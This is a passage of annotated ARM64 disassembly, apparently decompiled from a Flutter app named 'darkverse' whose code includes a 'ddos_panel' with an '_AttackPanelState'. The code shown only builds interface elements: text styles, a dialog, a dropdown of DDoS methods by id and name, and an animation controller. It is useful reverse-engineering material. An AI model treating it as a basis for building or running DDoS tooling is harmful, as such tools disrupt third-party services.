    // 0x8065f8: stur            x4, [fp, #-0x10]
    // 0x8065fc: r0 = TextStyle()
    //     0x8065fc: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x806600: mov             x1, x0
    // 0x806604: r0 = true
    //     0x806604: add             x0, NULL, #0x20  ; true
    // 0x806608: stur            x1, [fp, #-0x28]
    // 0x80660c: StoreField: r1->field_7 = r0
    //     0x80660c: stur            w0, [x1, #7]
    // 0x806610: ldur            x2, [fp, #-0x10]
    // 0x806614: StoreField: r1->field_b = r2
    //     0x806614: stur            w2, [x1, #0xb]
    // 0x806618: r3 = "Orbitron"
    //     0x806618: add             x3, PP, #0xc, lsl #12  ; [pp+0xcf20] "Orbitron"
    //     0x80661c: ldr             x3, [x3, #0xf20]
    // 0x806620: StoreField: r1->field_13 = r3
    //     0x806620: stur            w3, [x1, #0x13]
    // 0x806624: r0 = Text()
    //     0x806624: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x806628: mov             x2, x0
    // 0x80662c: ldur            x0, [fp, #-0x18]
    // 0x806630: stur            x2, [fp, #-0x30]
    // 0x806634: StoreField: r2->field_b = r0
    //     0x806634: stur            w0, [x2, #0xb]
    // 0x806638: ldur            x0, [fp, #-0x28]
    // 0x80663c: StoreField: r2->field_13 = r0
    //     0x80663c: stur            w0, [x2, #0x13]
    // 0x806640: ldur            x0, [fp, #-8]
    // 0x806644: ArrayLoad: r3 = r0[0]  ; List_4
    //     0x806644: ldur            w3, [x0, #0x17]
    // 0x806648: DecompressPointer r3
    //     0x806648: add             x3, x3, HEAP, lsl #32
    // 0x80664c: ldur            x1, [fp, #-0x10]
    // 0x806650: stur            x3, [fp, #-0x18]
    // 0x806654: d0 = 0.700000
    //     0x806654: add             x17, PP, #0x12, lsl #12  ; [pp+0x12098] IMM: double(0.7) from 0x3fe6666666666666
    //     0x806658: ldr             d0, [x17, #0x98]
    // 0x80665c: r0 = withOpacity()
    //     0x80665c: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x806660: stur            x0, [fp, #-0x10]
    // 0x806664: r0 = TextStyle()
    //     0x806664: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x806668: mov             x1, x0
    // 0x80666c: r0 = true
    //     0x80666c: add             x0, NULL, #0x20  ; true
    // 0x806670: stur            x1, [fp, #-0x28]
    // 0x806674: StoreField: r1->field_7 = r0
    //     0x806674: stur            w0, [x1, #7]
    // 0x806678: ldur            x2, [fp, #-0x10]
    // 0x80667c: StoreField: r1->field_b = r2
    //     0x80667c: stur            w2, [x1, #0xb]
    // 0x806680: r2 = "ShareTechMono"
    //     0x806680: add             x2, PP, #0x18, lsl #12  ; [pp+0x187c8] "ShareTechMono"
    //     0x806684: ldr             x2, [x2, #0x7c8]
    // 0x806688: StoreField: r1->field_13 = r2
    //     0x806688: stur            w2, [x1, #0x13]
    // 0x80668c: r0 = Text()
    //     0x80668c: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x806690: mov             x1, x0
    // 0x806694: ldur            x0, [fp, #-0x18]
    // 0x806698: stur            x1, [fp, #-0x10]
    // 0x80669c: StoreField: r1->field_b = r0
    //     0x80669c: stur            w0, [x1, #0xb]
    // 0x8066a0: ldur            x0, [fp, #-0x28]
    // 0x8066a4: StoreField: r1->field_13 = r0
    //     0x8066a4: stur            w0, [x1, #0x13]
    // 0x8066a8: r0 = TextStyle()
    //     0x8066a8: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x8066ac: mov             x1, x0
    // 0x8066b0: r0 = true
    //     0x8066b0: add             x0, NULL, #0x20  ; true
    // 0x8066b4: stur            x1, [fp, #-0x18]
    // 0x8066b8: StoreField: r1->field_7 = r0
    //     0x8066b8: stur            w0, [x1, #7]
    // 0x8066bc: r2 = Instance_Color
    //     0x8066bc: add             x2, PP, #0x32, lsl #12  ; [pp+0x32f80] Obj!Color@a114c1
    //     0x8066c0: ldr             x2, [x2, #0xf80]
    // 0x8066c4: StoreField: r1->field_b = r2
    //     0x8066c4: stur            w2, [x1, #0xb]
    // 0x8066c8: r0 = Text()
    //     0x8066c8: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x8066cc: mov             x1, x0
    // 0x8066d0: r0 = "OK"
    //     0x8066d0: add             x0, PP, #0x16, lsl #12  ; [pp+0x16d90] "OK"
    //     0x8066d4: ldr             x0, [x0, #0xd90]
    // 0x8066d8: stur            x1, [fp, #-0x28]
    // 0x8066dc: StoreField: r1->field_b = r0
    //     0x8066dc: stur            w0, [x1, #0xb]
    // 0x8066e0: ldur            x0, [fp, #-0x18]
    // 0x8066e4: StoreField: r1->field_13 = r0
    //     0x8066e4: stur            w0, [x1, #0x13]
    // 0x8066e8: r0 = TextButton()
    //     0x8066e8: bl              #0x6ce7d0  ; AllocateTextButtonStub -> TextButton (size=0x40)
    // 0x8066ec: mov             x3, x0
    // 0x8066f0: r0 = false
    //     0x8066f0: add             x0, NULL, #0x30  ; false
    // 0x8066f4: stur            x3, [fp, #-0x18]
    // 0x8066f8: StoreField: r3->field_3b = r0
    //     0x8066f8: stur            w0, [x3, #0x3b]
    // 0x8066fc: ldur            x2, [fp, #-8]
    // 0x806700: r1 = Function '<anonymous closure>':.
    //     0x806700: add             x1, PP, #0x41, lsl #12  ; [pp+0x41050] AnonymousClosure: (0x73d18c), in [package:darkverse/install_panel_page.dart] _InstallPanelPageState::_actionButton (0x73d1f4)
    //     0x806704: ldr             x1, [x1, #0x50]
    // 0x806708: r0 = AllocateClosure()
    //     0x806708: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x80670c: mov             x1, x0
    // 0x806710: ldur            x0, [fp, #-0x18]
    // 0x806714: StoreField: r0->field_b = r1
    //     0x806714: stur            w1, [x0, #0xb]
    // 0x806718: r3 = false
    //     0x806718: add             x3, NULL, #0x30  ; false
    // 0x80671c: StoreField: r0->field_27 = r3
    //     0x80671c: stur            w3, [x0, #0x27]
    // 0x806720: r1 = true
    //     0x806720: add             x1, NULL, #0x20  ; true
    // 0x806724: StoreField: r0->field_2f = r1
    //     0x806724: stur            w1, [x0, #0x2f]
    // 0x806728: ldur            x1, [fp, #-0x28]
    // 0x80672c: StoreField: r0->field_37 = r1
    //     0x80672c: stur            w1, [x0, #0x37]
    // 0x806730: r1 = Null
    //     0x806730: mov             x1, NULL
    // 0x806734: r2 = 2
    //     0x806734: mov             x2, #2
    // 0x806738: r0 = AllocateArray()
    //     0x806738: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x80673c: mov             x2, x0
    // 0x806740: ldur            x0, [fp, #-0x18]
    // 0x806744: stur            x2, [fp, #-8]
    // 0x806748: StoreField: r2->field_f = r0
    //     0x806748: stur            w0, [x2, #0xf]
    // 0x80674c: r1 = <Widget>
    //     0x80674c: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x806750: r0 = AllocateGrowableArray()
    //     0x806750: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x806754: mov             x1, x0
    // 0x806758: ldur            x0, [fp, #-8]
    // 0x80675c: stur            x1, [fp, #-0x18]
    // 0x806760: StoreField: r1->field_f = r0
    //     0x806760: stur            w0, [x1, #0xf]
    // 0x806764: r0 = 2
    //     0x806764: mov             x0, #2
    // 0x806768: StoreField: r1->field_b = r0
    //     0x806768: stur            w0, [x1, #0xb]
    // 0x80676c: r0 = AlertDialog()
    //     0x80676c: bl              #0x7955d8  ; AllocateAlertDialogStub -> AlertDialog (size=0x70)
    // 0x806770: ldur            x1, [fp, #-0x30]
    // 0x806774: StoreField: r0->field_f = r1
    //     0x806774: stur            w1, [x0, #0xf]
    // 0x806778: ldur            x1, [fp, #-0x10]
    // 0x80677c: StoreField: r0->field_1b = r1
    //     0x80677c: stur            w1, [x0, #0x1b]
    // 0x806780: ldur            x1, [fp, #-0x18]
    // 0x806784: StoreField: r0->field_27 = r1
    //     0x806784: stur            w1, [x0, #0x27]
    // 0x806788: r1 = Instance_Color
    //     0x806788: add             x1, PP, #0x32, lsl #12  ; [pp+0x32fa0] Obj!Color@a11491
    //     0x80678c: ldr             x1, [x1, #0xfa0]
    // 0x806790: StoreField: r0->field_43 = r1
    //     0x806790: stur            w1, [x0, #0x43]
    // 0x806794: ldur            x1, [fp, #-0x20]
    // 0x806798: StoreField: r0->field_5f = r1
    //     0x806798: stur            w1, [x0, #0x5f]
    // 0x80679c: r1 = false
    //     0x80679c: add             x1, NULL, #0x30  ; false
    // 0x8067a0: StoreField: r0->field_6b = r1
    //     0x8067a0: stur            w1, [x0, #0x6b]
    // 0x8067a4: LeaveFrame
    //     0x8067a4: mov             SP, fp
    //     0x8067a8: ldp             fp, lr, [SP], #0x10
    // 0x8067ac: ret
    //     0x8067ac: ret             
    // 0x8067b0: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x8067b0: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x8067b4: b               #0x806554
  }
  [closure] void <anonymous closure>(dynamic, String?) {
    // ** addr: 0x8067b8, size: 0x84
    // 0x8067b8: EnterFrame
    //     0x8067b8: stp             fp, lr, [SP, #-0x10]!
    //     0x8067bc: mov             fp, SP
    // 0x8067c0: AllocStack(0x10)
    //     0x8067c0: sub             SP, SP, #0x10
    // 0x8067c4: SetupParameters([dynamic _ /* r0 */])
    //     0x8067c4: ldr             x0, [fp, #0x18]
    //     0x8067c8: ldur            w1, [x0, #0x17]
    //     0x8067cc: add             x1, x1, HEAP, lsl #32
    //     0x8067d0: stur            x1, [fp, #-8]
    // 0x8067d4: CheckStackOverflow
    //     0x8067d4: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x8067d8: cmp             SP, x16
    //     0x8067dc: b.ls            #0x806834
    // 0x8067e0: r1 = 1
    //     0x8067e0: mov             x1, #1
    // 0x8067e4: r0 = AllocateContext()
    //     0x8067e4: bl              #0xbf6ad8  ; AllocateContextStub
    // 0x8067e8: mov             x1, x0
    // 0x8067ec: ldur            x0, [fp, #-8]
    // 0x8067f0: StoreField: r1->field_b = r0
    //     0x8067f0: stur            w0, [x1, #0xb]
    // 0x8067f4: ldr             x2, [fp, #0x10]
    // 0x8067f8: StoreField: r1->field_f = r2
    //     0x8067f8: stur            w2, [x1, #0xf]
    // 0x8067fc: LoadField: r3 = r0->field_f
    //     0x8067fc: ldur            w3, [x0, #0xf]
    // 0x806800: DecompressPointer r3
    //     0x806800: add             x3, x3, HEAP, lsl #32
    // 0x806804: mov             x2, x1
    // 0x806808: stur            x3, [fp, #-0x10]
    // 0x80680c: r1 = Function '<anonymous closure>':.
    //     0x80680c: add             x1, PP, #0x41, lsl #12  ; [pp+0x41058] AnonymousClosure: (0x80683c), in [package:darkverse/ddos_panel.dart] _AttackPanelState::build (0x804818)
    //     0x806810: ldr             x1, [x1, #0x58]
    // 0x806814: r0 = AllocateClosure()
    //     0x806814: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x806818: ldur            x1, [fp, #-0x10]
    // 0x80681c: mov             x2, x0
    // 0x806820: r0 = setState()
    //     0x806820: bl              #0x457110  ; [package:flutter/src/widgets/framework.dart] State::setState
    // 0x806824: r0 = Null
    //     0x806824: mov             x0, NULL
    // 0x806828: LeaveFrame
    //     0x806828: mov             SP, fp
    //     0x80682c: ldp             fp, lr, [SP], #0x10
    // 0x806830: ret
    //     0x806830: ret             
    // 0x806834: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x806834: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x806838: b               #0x8067e0
  }
  [closure] void <anonymous closure>(dynamic) {
    // ** addr: 0x80683c, size: 0x64
    // 0x80683c: ldr             x1, [SP]
    // 0x806840: ArrayLoad: r2 = r1[0]  ; List_4
    //     0x806840: ldur            w2, [x1, #0x17]
    // 0x806844: DecompressPointer r2
    //     0x806844: add             x2, x2, HEAP, lsl #32
    // 0x806848: LoadField: r1 = r2->field_b
    //     0x806848: ldur            w1, [x2, #0xb]
    // 0x80684c: DecompressPointer r1
    //     0x80684c: add             x1, x1, HEAP, lsl #32
    // 0x806850: LoadField: r3 = r1->field_f
    //     0x806850: ldur            w3, [x1, #0xf]
    // 0x806854: DecompressPointer r3
    //     0x806854: add             x3, x3, HEAP, lsl #32
    // 0x806858: LoadField: r0 = r2->field_f
    //     0x806858: ldur            w0, [x2, #0xf]
    // 0x80685c: DecompressPointer r0
    //     0x80685c: add             x0, x0, HEAP, lsl #32
    // 0x806860: cmp             w0, NULL
    // 0x806864: b.eq            #0x806894
    // 0x806868: StoreField: r3->field_2b = r0
    //     0x806868: stur            w0, [x3, #0x2b]
    //     0x80686c: ldurb           w16, [x3, #-1]
    //     0x806870: ldurb           w17, [x0, #-1]
    //     0x806874: and             x16, x17, x16, lsr #2
    //     0x806878: tst             x16, HEAP, lsr #32
    //     0x80687c: b.eq            #0x80688c
    //     0x806880: str             lr, [SP, #-8]!
    //     0x806884: bl              #0xbf6274  ; WriteBarrierWrappersStub
    //     0x806888: ldr             lr, [SP], #8
    // 0x80688c: r0 = Null
    //     0x80688c: mov             x0, NULL
    // 0x806890: ret
    //     0x806890: ret             
    // 0x806894: EnterFrame
    //     0x806894: stp             fp, lr, [SP, #-0x10]!
    //     0x806898: mov             fp, SP
    // 0x80689c: r0 = NullCastErrorSharedWithoutFPURegs()
    //     0x80689c: bl              #0xbf8364  ; NullCastErrorSharedWithoutFPURegsStub
  }
  [closure] DropdownMenuItem<String> <anonymous closure>(dynamic, Map<String, dynamic>) {
    // ** addr: 0x8068a0, size: 0x174
    // 0x8068a0: EnterFrame
    //     0x8068a0: stp             fp, lr, [SP, #-0x10]!
    //     0x8068a4: mov             fp, SP
    // 0x8068a8: AllocStack(0x20)
    //     0x8068a8: sub             SP, SP, #0x20
    // 0x8068ac: SetupParameters([dynamic _ /* r0 */])
    //     0x8068ac: ldr             x0, [fp, #0x18]
    //     0x8068b0: ldur            w3, [x0, #0x17]
    //     0x8068b4: add             x3, x3, HEAP, lsl #32
    //     0x8068b8: stur            x3, [fp, #-8]
    // 0x8068bc: CheckStackOverflow
    //     0x8068bc: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x8068c0: cmp             SP, x16
    //     0x8068c4: b.ls            #0x806a0c
    // 0x8068c8: ldr             x4, [fp, #0x10]
    // 0x8068cc: r0 = LoadClassIdInstr(r4)
    //     0x8068cc: ldur            x0, [x4, #-1]
    //     0x8068d0: ubfx            x0, x0, #0xc, #0x14
    // 0x8068d4: mov             x1, x4
    // 0x8068d8: r2 = "ddos_id"
    //     0x8068d8: add             x2, PP, #0x41, lsl #12  ; [pp+0x41060] "ddos_id"
    //     0x8068dc: ldr             x2, [x2, #0x60]
    // 0x8068e0: r0 = GDT[cid_x0 + -0x9d7]()
    //     0x8068e0: sub             lr, x0, #0x9d7
    //     0x8068e4: ldr             lr, [x21, lr, lsl #3]
    //     0x8068e8: blr             lr
    // 0x8068ec: mov             x3, x0
    // 0x8068f0: r2 = Null
    //     0x8068f0: mov             x2, NULL
    // 0x8068f4: r1 = Null
    //     0x8068f4: mov             x1, NULL
    // 0x8068f8: stur            x3, [fp, #-0x10]
    // 0x8068fc: r4 = 60
    //     0x8068fc: mov             x4, #0x3c
    // 0x806900: branchIfSmi(r0, 0x80690c)
    //     0x806900: tbz             w0, #0, #0x80690c
    // 0x806904: r4 = LoadClassIdInstr(r0)
    //     0x806904: ldur            x4, [x0, #-1]
    //     0x806908: ubfx            x4, x4, #0xc, #0x14
    // 0x80690c: sub             x4, x4, #0x5e
    // 0x806910: cmp             x4, #1
    // 0x806914: b.ls            #0x806928
    // 0x806918: r8 = String?
    //     0x806918: ldr             x8, [PP, #0x3c60]  ; [pp+0x3c60] Type: String?
    // 0x80691c: r3 = Null
    //     0x80691c: add             x3, PP, #0x41, lsl #12  ; [pp+0x41068] Null
    //     0x806920: ldr             x3, [x3, #0x68]
    // 0x806924: r0 = String?()
    //     0x806924: bl              #0x45a3e4  ; IsType_String?_Stub
    // 0x806928: ldr             x1, [fp, #0x10]
    // 0x80692c: r0 = LoadClassIdInstr(r1)
    //     0x80692c: ldur            x0, [x1, #-1]
    //     0x806930: ubfx            x0, x0, #0xc, #0x14
    // 0x806934: r2 = "ddos_name"
    //     0x806934: add             x2, PP, #0x41, lsl #12  ; [pp+0x41078] "ddos_name"
    //     0x806938: ldr             x2, [x2, #0x78]
    // 0x80693c: r0 = GDT[cid_x0 + -0x9d7]()
    //     0x80693c: sub             lr, x0, #0x9d7
    //     0x806940: ldr             lr, [x21, lr, lsl #3]
    //     0x806944: blr             lr
    // 0x806948: mov             x3, x0
    // 0x80694c: r2 = Null
    //     0x80694c: mov             x2, NULL
    // 0x806950: r1 = Null
    //     0x806950: mov             x1, NULL
    // 0x806954: stur            x3, [fp, #-0x18]
    // 0x806958: r4 = 60
    //     0x806958: mov             x4, #0x3c
    // 0x80695c: branchIfSmi(r0, 0x806968)
    //     0x80695c: tbz             w0, #0, #0x806968
    // 0x806960: r4 = LoadClassIdInstr(r0)
    //     0x806960: ldur            x4, [x0, #-1]
    //     0x806964: ubfx            x4, x4, #0xc, #0x14
    // 0x806968: sub             x4, x4, #0x5e
    // 0x80696c: cmp             x4, #1
    // 0x806970: b.ls            #0x806984
    // 0x806974: r8 = String
    //     0x806974: ldr             x8, [PP, #0x238]  ; [pp+0x238] Type: String
    // 0x806978: r3 = Null
    //     0x806978: add             x3, PP, #0x41, lsl #12  ; [pp+0x41080] Null
    //     0x80697c: ldr             x3, [x3, #0x80]
    // 0x806980: r0 = String()
    //     0x806980: bl              #0xbfe1d8  ; IsType_String_Stub
    // 0x806984: ldur            x0, [fp, #-8]
    // 0x806988: LoadField: r1 = r0->field_f
    //     0x806988: ldur            w1, [x0, #0xf]
    // 0x80698c: DecompressPointer r1
    //     0x80698c: add             x1, x1, HEAP, lsl #32
    // 0x806990: LoadField: r0 = r1->field_3b
    //     0x806990: ldur            w0, [x1, #0x3b]
    // 0x806994: DecompressPointer r0
    //     0x806994: add             x0, x0, HEAP, lsl #32
    // 0x806998: stur            x0, [fp, #-8]
    // 0x80699c: r0 = TextStyle()
    //     0x80699c: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x8069a0: mov             x1, x0
    // 0x8069a4: r0 = true
    //     0x8069a4: add             x0, NULL, #0x20  ; true
    // 0x8069a8: stur            x1, [fp, #-0x20]
    // 0x8069ac: StoreField: r1->field_7 = r0
    //     0x8069ac: stur            w0, [x1, #7]
    // 0x8069b0: ldur            x2, [fp, #-8]
    // 0x8069b4: StoreField: r1->field_b = r2
    //     0x8069b4: stur            w2, [x1, #0xb]
    // 0x8069b8: r0 = Text()
    //     0x8069b8: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x8069bc: mov             x2, x0
    // 0x8069c0: ldur            x0, [fp, #-0x18]
    // 0x8069c4: stur            x2, [fp, #-8]
    // 0x8069c8: StoreField: r2->field_b = r0
    //     0x8069c8: stur            w0, [x2, #0xb]
    // 0x8069cc: ldur            x0, [fp, #-0x20]
    // 0x8069d0: StoreField: r2->field_13 = r0
    //     0x8069d0: stur            w0, [x2, #0x13]
    // 0x8069d4: r1 = <String>
    //     0x8069d4: ldr             x1, [PP, #0x3e0]  ; [pp+0x3e0] TypeArguments: <String>
    // 0x8069d8: r0 = DropdownMenuItem()
    //     0x8069d8: bl              #0x806a14  ; AllocateDropdownMenuItemStub -> DropdownMenuItem<X0> (size=0x24)
    // 0x8069dc: ldur            x1, [fp, #-0x10]
    // 0x8069e0: StoreField: r0->field_1b = r1
    //     0x8069e0: stur            w1, [x0, #0x1b]
    // 0x8069e4: r1 = true
    //     0x8069e4: add             x1, NULL, #0x20  ; true
    // 0x8069e8: StoreField: r0->field_1f = r1
    //     0x8069e8: stur            w1, [x0, #0x1f]
    // 0x8069ec: r1 = Instance_AlignmentDirectional
    //     0x8069ec: add             x1, PP, #0x18, lsl #12  ; [pp+0x18890] Obj!AlignmentDirectional@a09c51
    //     0x8069f0: ldr             x1, [x1, #0x890]
    // 0x8069f4: StoreField: r0->field_f = r1
    //     0x8069f4: stur            w1, [x0, #0xf]
    // 0x8069f8: ldur            x1, [fp, #-8]
    // 0x8069fc: StoreField: r0->field_b = r1
    //     0x8069fc: stur            w1, [x0, #0xb]
    // 0x806a00: LeaveFrame
    //     0x806a00: mov             SP, fp
    //     0x806a04: ldp             fp, lr, [SP], #0x10
    // 0x806a08: ret
    //     0x806a08: ret             
    // 0x806a0c: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x806a0c: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x806a10: b               #0x8068c8
  }
  [closure] void <anonymous closure>(dynamic, double) {
    // ** addr: 0x806a20, size: 0x84
    // 0x806a20: EnterFrame
    //     0x806a20: stp             fp, lr, [SP, #-0x10]!
    //     0x806a24: mov             fp, SP
    // 0x806a28: AllocStack(0x10)
    //     0x806a28: sub             SP, SP, #0x10
    // 0x806a2c: SetupParameters([dynamic _ /* r0 */])
    //     0x806a2c: ldr             x0, [fp, #0x18]
    //     0x806a30: ldur            w1, [x0, #0x17]
    //     0x806a34: add             x1, x1, HEAP, lsl #32
    //     0x806a38: stur            x1, [fp, #-8]
    // 0x806a3c: CheckStackOverflow
    //     0x806a3c: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x806a40: cmp             SP, x16
    //     0x806a44: b.ls            #0x806a9c
    // 0x806a48: r1 = 1
    //     0x806a48: mov             x1, #1
    // 0x806a4c: r0 = AllocateContext()
    //     0x806a4c: bl              #0xbf6ad8  ; AllocateContextStub
    // 0x806a50: mov             x1, x0
    // 0x806a54: ldur            x0, [fp, #-8]
    // 0x806a58: StoreField: r1->field_b = r0
    //     0x806a58: stur            w0, [x1, #0xb]
    // 0x806a5c: ldr             x2, [fp, #0x10]
    // 0x806a60: StoreField: r1->field_f = r2
    //     0x806a60: stur            w2, [x1, #0xf]
    // 0x806a64: LoadField: r3 = r0->field_f
    //     0x806a64: ldur            w3, [x0, #0xf]
    // 0x806a68: DecompressPointer r3
    //     0x806a68: add             x3, x3, HEAP, lsl #32
    // 0x806a6c: mov             x2, x1
    // 0x806a70: stur            x3, [fp, #-0x10]
    // 0x806a74: r1 = Function '<anonymous closure>':.
    //     0x806a74: add             x1, PP, #0x41, lsl #12  ; [pp+0x41090] AnonymousClosure: (0x806aa4), in [package:darkverse/ddos_panel.dart] _AttackPanelState::build (0x804818)
    //     0x806a78: ldr             x1, [x1, #0x90]
    // 0x806a7c: r0 = AllocateClosure()
    //     0x806a7c: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x806a80: ldur            x1, [fp, #-0x10]
    // 0x806a84: mov             x2, x0
    // 0x806a88: r0 = setState()
    //     0x806a88: bl              #0x457110  ; [package:flutter/src/widgets/framework.dart] State::setState
    // 0x806a8c: r0 = Null
    //     0x806a8c: mov             x0, NULL
    // 0x806a90: LeaveFrame
    //     0x806a90: mov             SP, fp
    //     0x806a94: ldp             fp, lr, [SP], #0x10
    // 0x806a98: ret
    //     0x806a98: ret             
    // 0x806a9c: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x806a9c: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x806aa0: b               #0x806a48
  }
  [closure] void <anonymous closure>(dynamic) {
    // ** addr: 0x806aa4, size: 0x30
    // 0x806aa4: ldr             x1, [SP]
    // 0x806aa8: ArrayLoad: r2 = r1[0]  ; List_4
    //     0x806aa8: ldur            w2, [x1, #0x17]
    // 0x806aac: DecompressPointer r2
    //     0x806aac: add             x2, x2, HEAP, lsl #32
    // 0x806ab0: LoadField: r1 = r2->field_b
    //     0x806ab0: ldur            w1, [x2, #0xb]
    // 0x806ab4: DecompressPointer r1
    //     0x806ab4: add             x1, x1, HEAP, lsl #32
    // 0x806ab8: LoadField: r3 = r1->field_f
    //     0x806ab8: ldur            w3, [x1, #0xf]
    // 0x806abc: DecompressPointer r3
    //     0x806abc: add             x3, x3, HEAP, lsl #32
    // 0x806ac0: LoadField: r0 = r2->field_f
    //     0x806ac0: ldur            w0, [x2, #0xf]
    // 0x806ac4: DecompressPointer r0
    //     0x806ac4: add             x0, x0, HEAP, lsl #32
    // 0x806ac8: LoadField: d0 = r0->field_7
    //     0x806ac8: ldur            d0, [x0, #7]
    // 0x806acc: StoreField: r3->field_2f = d0
    //     0x806acc: stur            d0, [x3, #0x2f]
    // 0x806ad0: ret
    //     0x806ad0: ret             
  }
  _ initState(/* No info */) {
    // ** addr: 0x980d90, size: 0x168
    // 0x980d90: EnterFrame
    //     0x980d90: stp             fp, lr, [SP, #-0x10]!
    //     0x980d94: mov             fp, SP
    // 0x980d98: AllocStack(0x18)
    //     0x980d98: sub             SP, SP, #0x18
    // 0x980d9c: SetupParameters(_AttackPanelState this /* r1 => r2, fp-0x8 */)
    //     0x980d9c: mov             x2, x1
    //     0x980da0: stur            x1, [fp, #-8]
    // 0x980da4: CheckStackOverflow
    //     0x980da4: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x980da8: cmp             SP, x16
    //     0x980dac: b.ls            #0x980ee8
    // 0x980db0: r1 = <double>
    //     0x980db0: ldr             x1, [PP, #0x41e0]  ; [pp+0x41e0] TypeArguments: <double>
    // 0x980db4: r0 = AnimationController()
    //     0x980db4: bl              #0x4c5290  ; AllocateAnimationControllerStub -> AnimationController (size=0x4c)
    // 0x980db8: stur            x0, [fp, #-0x10]
    // 0x980dbc: r16 = Instance_Duration
    //     0x980dbc: add             x16, PP, #0x15, lsl #12  ; [pp+0x15310] Obj!Duration@a442e1
    //     0x980dc0: ldr             x16, [x16, #0x310]
    // 0x980dc4: str             x16, [SP]
    // 0x980dc8: mov             x1, x0
    // 0x980dcc: ldur            x2, [fp, #-8]
    // 0x980dd0: r4 = const [0, 0x3, 0x1, 0x2, duration, 0x2, null]
    //     0x980dd0: add             x4, PP, #0xc, lsl #12  ; [pp+0xca00] List(7) [0, 0x3, 0x1, 0x2, "duration", 0x2, Null]
    //     0x980dd4: ldr             x4, [x4, #0xa00]
    // 0x980dd8: r0 = AnimationController()
    //     0x980dd8: bl              #0x572470  ; [package:flutter/src/animation/animation_controller.dart] AnimationController::AnimationController
    // 0x980ddc: r16 = true
    //     0x980ddc: add             x16, NULL, #0x20  ; true
    // 0x980de0: str             x16, [SP]
    // 0x980de4: ldur            x1, [fp, #-0x10]
    // 0x980de8: r4 = const [0, 0x2, 0x1, 0x1, reverse, 0x1, null]
    //     0x980de8: add             x4, PP, #0xc, lsl #12  ; [pp+0xce50] List(7) [0, 0x2, 0x1, 0x1, "reverse", 0x1, Null]
    //     0x980dec: ldr             x4, [x4, #0xe50]
    // 0x980df0: r0 = repeat()
    //     0x980df0: bl              #0x684120  ; [package:flutter/src/animation/animation_controller.dart] AnimationController::repeat
    // 0x980df4: ldur            x0, [fp, #-0x10]
    // 0x980df8: ldur            x3, [fp, #-8]
    // 0x980dfc: StoreField: r3->field_27 = r0
    //     0x980dfc: stur            w0, [x3, #0x27]
    //     0x980e00: ldurb           w16, [x3, #-1]
    //     0x980e04: ldurb           w17, [x0, #-1]
    //     0x980e08: and             x16, x17, x16, lsr #2
    //     0x980e0c: tst             x16, HEAP, lsr #32
    //     0x980e10: b.eq            #0x980e18
    //     0x980e14: bl              #0xbf6274  ; WriteBarrierWrappersStub
    // 0x980e18: LoadField: r0 = r3->field_b
    //     0x980e18: ldur            w0, [x3, #0xb]
    // 0x980e1c: DecompressPointer r0
    //     0x980e1c: add             x0, x0, HEAP, lsl #32
    // 0x980e20: cmp             w0, NULL
    // 0x980e24: b.eq            #0x980ef0
    // 0x980e28: LoadField: r2 = r0->field_f
    //     0x980e28: ldur            w2, [x0, #0xf]
    // 0x980e2c: DecompressPointer r2
    //     0x980e2c: add             x2, x2, HEAP, lsl #32
    // 0x980e30: LoadField: r0 = r2->field_b
    //     0x980e30: ldur            w0, [x2, #0xb]
    // 0x980e34: r1 = LoadInt32Instr(r0)
    //     0x980e34: sbfx            x1, x0, #1, #0x1f
    // 0x980e38: cbz             w0, #0x980ed8
    // 0x980e3c: mov             x0, x1
    // 0x980e40: r1 = 0
    //     0x980e40: mov             x1, #0
    // 0x980e44: cmp             x1, x0
    // 0x980e48: b.hs            #0x980ef4
    // 0x980e4c: LoadField: r0 = r2->field_f
    //     0x980e4c: ldur            w0, [x2, #0xf]
    // 0x980e50: DecompressPointer r0
    //     0x980e50: add             x0, x0, HEAP, lsl #32
    // 0x980e54: LoadField: r1 = r0->field_f
    //     0x980e54: ldur            w1, [x0, #0xf]
    // 0x980e58: DecompressPointer r1
    //     0x980e58: add             x1, x1, HEAP, lsl #32
    // 0x980e5c: r0 = LoadClassIdInstr(r1)
    //     0x980e5c: ldur            x0, [x1, #-1]
    //     0x980e60: ubfx            x0, x0, #0xc, #0x14
    // 0x980e64: r2 = "ddos_id"
    //     0x980e64: add             x2, PP, #0x41, lsl #12  ; [pp+0x41060] "ddos_id"
    //     0x980e68: ldr             x2, [x2, #0x60]
    // 0x980e6c: r0 = GDT[cid_x0 + -0x9d7]()
    //     0x980e6c: sub             lr, x0, #0x9d7
    //     0x980e70: ldr             lr, [x21, lr, lsl #3]
    //     0x980e74: blr             lr
    // 0x980e78: mov             x3, x0
    // 0x980e7c: r2 = Null
    //     0x980e7c: mov             x2, NULL
    // 0x980e80: r1 = Null
    //     0x980e80: mov             x1, NULL
    // 0x980e84: stur            x3, [fp, #-0x10]
    // 0x980e88: r4 = 60
    //     0x980e88: mov             x4, #0x3c
